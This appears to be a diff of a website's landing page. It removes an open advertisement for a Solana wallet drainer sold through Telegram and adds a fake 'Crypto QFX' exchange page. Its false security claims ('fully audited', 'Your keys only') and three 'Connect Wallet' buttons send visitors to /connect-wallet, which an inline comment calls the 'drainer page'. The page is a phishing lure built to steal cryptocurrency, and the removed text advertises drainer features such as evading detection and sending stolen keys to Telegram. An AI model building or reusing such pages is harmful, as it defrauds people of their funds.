@@ -1,77 +1,253 @@
 <!DOCTYPE html>
-<html lang="en">
 
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Wallet Drainer - Ultimate Tool</title>
-
-    <!-- Fonts -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
-
-    <!-- CSS -->
-    <link rel="stylesheet" href="/css/style.css">
-
-    <!-- Libraries -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+<html class="dark" lang="en"><head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Crypto QFX | Next-Gen FX Exchange</title>
+<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght@100..700,0..1&amp;display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap" rel="stylesheet"/>
+<script id="tailwind-config">
+        tailwind.config = {
+            darkMode: "class",
+            theme: {
+                extend: {
+                    colors: {
+                        "primary": "#12e258",
+                        "background-light": "#f6f8f6",
+                        "background-dark": "#0a110d",
+                        "accent-blue": "#1e3a8a",
+                    },
+                    fontFamily: {
+                        "display": ["Space Grotesk", "sans-serif"]
+                    },
+                    borderRadius: {
+                        "DEFAULT": "0.25rem",
+                        "lg": "0.5rem",
+                        "xl": "0.75rem",
+                        "full": "9999px"
+                    },
+                },
+            },
+        }
+    </script>
+<style>
+        .glass-panel {
+            background: rgba(16, 34, 22, 0.7);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(18, 226, 88, 0.1);
+        }
+        .hero-glow {
+            background: radial-gradient(circle at center, rgba(18, 226, 88, 0.15) 0%, transparent 70%);
+        }
+        .bg-3d-mesh {
+            background-image: radial-gradient(circle at 2px 2px, rgba(18, 226, 88, 0.05) 1px, transparent 0);
+            background-size: 40px 40px;
+        }
+    </style>
 </head>
-
-<body>
-    <div id="canvas-container"></div>
-
-    <div class="overlay">
-        <nav>
-            <div class="logo">
-                <i class="fa-solid fa-ghost"></i> PHANTOM DRAINER
-            </div>
-            <a href="https://t.me/cirlus0x" target="_blank" class="btn-secondary">
-                <i class="fa-brands fa-telegram"></i> Contact Support
-            </a>
-        </nav>
-
-        <main class="landing-container">
-            <div class="hero-section">
-                <h1 class="glitch-text" data-text="CHANGE YOUR FUTURE">CHANGE YOUR FUTURE</h1>
-                <p class="subtitle">The most advanced, high-performance Solana Wallet Drainer available on the market.
-                    Secure. Fast. Undetectable.</p>
-
-                <div class="features-grid">
-                    <div class="feature-card">
-                        <i class="fa-solid fa-bolt"></i>
-                        <h3>Instant Transfer</h3>
-                        <p>Moves all assets in a single transaction block.</p>
+<body class="bg-background-light dark:bg-background-dark font-display text-slate-900 dark:text-white transition-colors duration-300">
+<!-- Background Decor -->
+<div class="fixed inset-0 z-0 pointer-events-none overflow-hidden">
+<div class="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-primary/10 blur-[120px] rounded-full"></div>
+<div class="absolute bottom-[-10%] right-[-10%] w-[50%] h-[50%] bg-accent-blue/10 blur-[150px] rounded-full"></div>
+<div class="absolute inset-0 bg-3d-mesh opacity-30"></div>
+</div>
+<div class="relative z-10 flex min-h-screen flex-col">
+<!-- TopNavBar -->
+<header class="flex items-center justify-between px-6 py-4 lg:px-20 border-b border-white/5 bg-background-dark/20 backdrop-blur-md sticky top-0 z-50">
+<div class="flex items-center gap-3">
+<div class="w-6 h-6 md:w-8 md:h-8 text-primary">
+<svg fill="none" viewbox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+<path d="M36.7273 44C33.9891 44 31.6043 39.8386 30.3636 33.69C29.123 39.8386 26.7382 44 24 44C21.2618 44 18.877 39.8386 17.6364 33.69C16.3957 39.8386 14.0109 44 11.2727 44C7.25611 44 4 35.0457 4 24C4 12.9543 7.25611 4 11.2727 4C14.0109 4 16.3957 8.16144 17.6364 14.31C18.877 8.16144 21.2618 4 24 4C26.7382 4 29.123 8.16144 30.3636 14.31C31.6043 8.16144 33.9891 4 36.7273 4C40.7439 4 44 12.9543 44 24C44 35.0457 40.7439 44 36.7273 44Z" fill="currentColor"></path>
+</svg>
+</div>
+<h2 class="text-xl font-bold tracking-tight text-white">Crypto <span class="text-primary">QFX</span></h2>
+</div>
+<nav class="hidden md:flex items-center gap-10">
+<a class="text-sm font-medium text-white/70 hover:text-primary transition-colors" href="#">Trade</a>
+<a class="text-sm font-medium text-white/70 hover:text-primary transition-colors" href="#">Liquidity</a>
+<a class="text-sm font-medium text-white/70 hover:text-primary transition-colors" href="#">Governance</a>
+<a class="text-sm font-medium text-white/70 hover:text-primary transition-colors" href="#">Docs</a>
+</nav>
+<div class="flex items-center gap-4">
+<button id="connect-wallet-btn" class="flex items-center justify-center gap-2 rounded-lg border border-primary/30 px-4 py-2 text-sm font-bold text-primary hover:bg-primary/10 transition-all">
+<span class="material-symbols-outlined text-[18px]">account_balance_wallet</span>
+<span class="hidden sm:inline">Connect</span>
+</button>
+</div>
+</header>
+<!-- HeroSection with Wallet First Approach -->
+<main class="flex-1">
+<section class="relative flex flex-col items-center justify-center px-6 py-20 lg:py-32 overflow-hidden">
+<div class="hero-glow absolute inset-0"></div>
+<div class="max-w-4xl text-center flex flex-col items-center relative z-10">
+<div class="mb-6 inline-flex items-center gap-2 rounded-full border border-primary/20 bg-primary/10 px-4 py-1.5 text-xs font-bold uppercase tracking-widest text-primary">
+<span class="relative flex h-2 w-2">
+<span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-primary opacity-75"></span>
+<span class="relative inline-flex rounded-full h-2 w-2 bg-primary"></span>
+</span>
+                        Live on Mainnet
                     </div>
-                    <div class="feature-card">
-                        <i class="fa-solid fa-shield-halved"></i>
-                        <h3>Anti-Detect</h3>
-                        <p>Completely mimics legitimate dApp behavior.</p>
-                    </div>
-                    <div class="feature-card">
-                        <i class="fa-brands fa-telegram"></i>
-                        <h3>Live Reporting</h3>
-                        <p>Receive keys and logs directly to Telegram.</p>
-                    </div>
+<h1 class="text-white text-5xl lg:text-7xl font-bold leading-tight tracking-tight mb-6">
+                        The Future of FX is <span class="text-transparent bg-clip-text bg-gradient-to-r from-primary to-emerald-400">On-Chain.</span>
+</h1>
+<p class="text-white/60 text-lg lg:text-xl max-w-2xl mb-12">
+                        Experience institutional-grade liquidity and lightning-fast execution. Our non-custodial engine is built for the professional trader.
+                    </p>
+<!-- Wallet Integration Modal/Card -->
+<div class="w-full max-w-md glass-panel p-8 rounded-xl shadow-2xl border border-white/10">
+<div class="flex flex-col gap-4">
+<button id="main-connect-btn" class="group flex w-full items-center justify-between rounded-lg bg-primary px-6 py-4 text-background-dark font-bold text-lg hover:shadow-[0_0_20px_rgba(18,226,88,0.4)] transition-all">
+<span>Connect Wallet to Trade</span>
+<span class="material-symbols-outlined transition-transform group-hover:translate-x-1">arrow_forward</span>
+</button>
+<div class="flex items-center gap-3 text-white/40 text-xs justify-center py-2">
+<span class="material-symbols-outlined text-[14px]">shield</span>
+                                Fully audited &amp; secure smart contracts
+                            </div>
+</div>
+<div class="mt-8 grid grid-cols-2 gap-4">
+<div class="flex flex-col items-start p-3 rounded-lg bg-white/5 border border-white/5">
+<span class="text-white/40 text-[10px] uppercase font-bold tracking-widest">Active Pool</span>
+<span class="text-white font-medium">USD/EUR</span>
+</div>
+<div class="flex flex-col items-start p-3 rounded-lg bg-white/5 border border-white/5">
+<span class="text-white/40 text-[10px] uppercase font-bold tracking-widest">Est. Gas</span>
+<span class="text-primary font-medium">&lt; $0.01</span>
+</div>
+</div>
+</div>
+</div>
+<!-- Floating Abstract Background Elements -->
+<div class="absolute top-1/4 left-10 w-24 h-24 glass-panel rounded-xl rotate-12 opacity-40 hidden xl:block" data-alt="Abstract floating glass tile pattern"></div>
+<div class="absolute bottom-1/4 right-10 w-32 h-32 glass-panel rounded-xl -rotate-12 opacity-30 hidden xl:block" data-alt="Abstract floating geometric glass element"></div>
+</section>
+<!-- FeatureSection -->
+<section class="max-w-[1200px] mx-auto px-6 py-20">
+<div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+<!-- Feature 1 -->
+<div class="group relative p-8 glass-panel rounded-xl hover:border-primary/40 transition-all">
+<div class="mb-4 inline-flex items-center justify-center p-3 rounded-lg bg-primary/10 text-primary">
+<span class="material-symbols-outlined">bolt</span>
+</div>
+<h3 class="text-xl font-bold text-white mb-2">Lightning Fast Trades</h3>
+<p class="text-white/50 leading-relaxed">
+                            Sub-second execution via our optimized routing engine. Trade at the speed of light with zero latency bottlenecks.
+                        </p>
+</div>
+<!-- Feature 2 -->
+<div class="group relative p-8 glass-panel rounded-xl hover:border-primary/40 transition-all">
+<div class="mb-4 inline-flex items-center justify-center p-3 rounded-lg bg-primary/10 text-primary">
+<span class="material-symbols-outlined">water_drop</span>
+</div>
+<h3 class="text-xl font-bold text-white mb-2">Deep Liquidity</h3>
+<p class="text-white/50 leading-relaxed">
+                            Aggregated pools from multiple DEXes and private LPs ensuring minimal slippage even for the largest institutional orders.
+                        </p>
+</div>
+<!-- Feature 3 -->
+<div class="group relative p-8 glass-panel rounded-xl hover:border-primary/40 transition-all">
+<div class="mb-4 inline-flex items-center justify-center p-3 rounded-lg bg-primary/10 text-primary">
+<span class="material-symbols-outlined">security</span>
+</div>
+<h3 class="text-xl font-bold text-white mb-2">Institutional Security</h3>
+<p class="text-white/50 leading-relaxed">
+                            Non-custodial by design. Multi-sig architecture and quarterly audited smart contracts by industry leaders.
+                        </p>
+</div>
+</div>
+</section>
+<!-- Stats Ticker -->
+<section class="border-t border-white/5 py-12">
+<div class="max-w-[1200px] mx-auto px-6">
+<div class="grid grid-cols-2 md:grid-cols-4 gap-8">
+<div class="text-center md:text-left">
+<div class="text-white/40 text-xs font-bold uppercase tracking-widest mb-1">Trading Pairs</div>
+<div class="text-2xl font-bold text-white">500+</div>
+<div class="text-xs text-primary mt-1">Available <span class="text-white/20">24/7</span></div>
+</div>
+<div class="text-center md:text-left">
+<div class="text-white/40 text-xs font-bold uppercase tracking-widest mb-1">Min Trade</div>
+<div class="text-2xl font-bold text-white">&lt; $1</div>
+<div class="text-xs text-primary mt-1">No minimum <span class="text-white/20">deposits</span></div>
+</div>
+<div class="text-center md:text-left">
+<div class="text-white/40 text-xs font-bold uppercase tracking-widest mb-1">Settlement</div>
+<div class="text-2xl font-bold text-white">&lt; 1s</div>
+<div class="text-xs text-primary mt-1">Instant <span class="text-white/20">execution</span></div>
+</div>
+<div class="text-center md:text-left">
+<div class="text-white/40 text-xs font-bold uppercase tracking-widest mb-1">Security</div>
+<div class="text-2xl font-bold text-white">Non-Custodial</div>
+<div class="text-xs text-primary mt-1">Your keys <span class="text-white/20">only</span></div>
+</div>
+</div>
+</div>
+</section>
+</main>
+<!-- CTASection -->
+<section class="bg-primary/5 py-20 px-6">
+<div class="max-w-4xl mx-auto text-center glass-panel p-12 rounded-2xl relative overflow-hidden border border-primary/20">
+<div class="absolute top-0 right-0 p-8 text-primary opacity-10">
+<span class="material-symbols-outlined text-9xl">rocket_launch</span>
+</div>
+<h2 class="text-3xl lg:text-4xl font-bold text-white mb-4">Join the Next Generation of FX</h2>
+<p class="text-white/60 mb-10 max-w-xl mx-auto">Connect your wallet now to access global FX markets with the transparency of the blockchain.</p>
+<div class="flex flex-col sm:flex-row items-center justify-center gap-4">
+<button id="cta-connect-btn" class="w-full sm:w-auto px-10 py-4 bg-primary text-background-dark font-bold rounded-lg hover:shadow-lg hover:shadow-primary/30 transition-all">
+                        Connect Your Wallet
+                    </button>
+<button class="w-full sm:w-auto px-10 py-4 border border-white/20 text-white font-bold rounded-lg hover:bg-white/5 transition-all">
+                        Read Documentation
+                    </button>
+</div>
+</div>
+</section>
+<!-- Footer -->
+<footer class="border-t border-white/5 px-6 py-12 bg-background-dark">
+<div class="max-w-[1200px] mx-auto flex flex-col md:flex-row justify-between items-center gap-8">
+<div class="flex items-center gap-3">
+<div class="w-6 h-6 text-primary">
+<svg fill="currentColor" viewbox="0 0 48 48">
+<path d="M36.7273 44C33.9891 44 31.6043 39.8386 30.3636 33.69C29.123 39.8386 26.7382 44 24 44C21.2618 44 18.877 39.8386 17.6364 33.69C16.3957 39.8386 14.0109 44 11.2727 44C7.25611 44 4 35.0457 4 24C4 12.9543 7.25611 4 11.2727 4C14.0109 4 16.3957 8.16144 17.6364 14.31C18.877 8.16144 21.2618 4 24 4C26.7382 4 29.123 8.16144 30.3636 14.31C31.6043 8.16144 33.9891 4 36.7273 4C40.7439 4 44 12.9543 44 24C44 35.0457 40.7439 44 36.7273 44Z"></path>
+</svg>
+</div>
+<h2 class="text-lg font-bold tracking-tight text-white">Crypto <span class="text-primary">QFX</span></h2>
+</div>
+<div class="flex gap-8 text-sm text-white/40">
+<a class="hover:text-primary transition-colors" href="#">Twitter</a>
+<a class="hover:text-primary transition-colors" href="#">Discord</a>
+<a class="hover:text-primary transition-colors" href="#">Telegram</a>
+<a class="hover:text-primary transition-colors" href="#">Medium</a>
+</div>
+<div class="text-xs text-white/20">
+                    © 2024 Crypto QFX Protocol. Built for decentralized finance.
                 </div>
+</div>
+</footer>
+</div>
 
-                <div class="cta-group">
-                    <a href="https://t.me/cirlus0x" target="_blank" class="btn-primary pulse-btn">
-                        <i class="fa-solid fa-cart-shopping"></i> BUY SOURCE CODE
-                    </a>
-                </div>
-            </div>
-        </main>
-
-        <footer>
-            <p>&copy; 2026 Phantom Security Research. <a href="https://t.me/cirlus0x" target="_blank">Get License</a>
-            </p>
-        </footer>
-    </div>
-
-    <script src="/js/script.js"></script>
-</body>
-
-</html>
+<!-- Include existing wallet functionality -->
+<script src="/js/wallet.js"></script>
+<script>
+// Connect wallet functionality to new buttons
+document.addEventListener('DOMContentLoaded', function() {
+    const connectButtons = [
+        document.getElementById('connect-wallet-btn'),
+        document.getElementById('main-connect-btn'),
+        document.getElementById('cta-connect-btn')
+    ];
+    
+    connectButtons.forEach(button => {
+        if (button) {
+            button.addEventListener('click', function() {
+                // Redirect to drainer page or trigger wallet connection
+                window.location.href = '/connect-wallet';
+            });
+        }
+    });
+});
+</script>
+</body></html>
